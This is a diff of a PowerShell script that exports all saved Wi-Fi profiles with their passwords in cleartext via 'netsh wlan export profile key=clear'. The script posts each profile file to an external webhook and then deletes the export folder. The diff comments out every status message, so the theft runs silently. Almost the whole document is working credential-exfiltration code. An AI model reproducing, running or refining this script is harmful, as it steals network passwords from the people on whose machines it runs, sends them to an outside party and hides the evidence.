@@ -6,7 +6,7 @@ if (-not (Test-Path $exportDir)) {
     try {
         New-Item -ItemType Directory -Path $exportDir -Force
     } catch {
-        Write-Host "Error creating export directory: $_"
+        #Write-Host "Error creating export directory: $_"
         return
     }
 }
@@ -15,14 +15,14 @@ if (-not (Test-Path $exportDir)) {
 try {
     netsh wlan export profile key=clear folder=$exportDir
 } catch {
-    Write-Host "Error exporting WLAN profiles: $_"
+    #Write-Host "Error exporting WLAN profiles: $_"
     return
 }
 
 # Read all exported XML files
 $xmlFiles = Get-ChildItem -Path $exportDir -Filter "*.xml"
 if ($xmlFiles.Count -eq 0) {
-    Write-Host "No exported WLAN profiles found."
+    #Write-Host "No exported WLAN profiles found."
     return
 }
 
@@ -71,9 +71,9 @@ foreach ($xmlFile in $xmlFiles) {
         $response = Invoke-RestMethod -Uri $whuri -Method Post -Body $bodyBytes -Headers @{
             "Content-Type" = $contentType
         }
-        Write-Host "Successfully sent to the webhook: $($xmlFile.Name)"
+        #Write-Host "Successfully sent to the webhook: $($xmlFile.Name)"
     } catch {
-        Write-Host "Error sending to webhook: $_"
+        #Write-Host "Error sending to webhook: $_"
     }
 }
 
@@ -81,9 +81,9 @@ foreach ($xmlFile in $xmlFiles) {
 if (Test-Path $exportDir) {
     try {
         Remove-Item -Path $exportDir -Recurse -Force
-        Write-Host "Export directory removed successfully."
+        #Write-Host "Export directory removed successfully."
     } catch {
-        Write-Host "Error removing export directory: $_"
+        #Write-Host "Error removing export directory: $_"
     }
 }
 
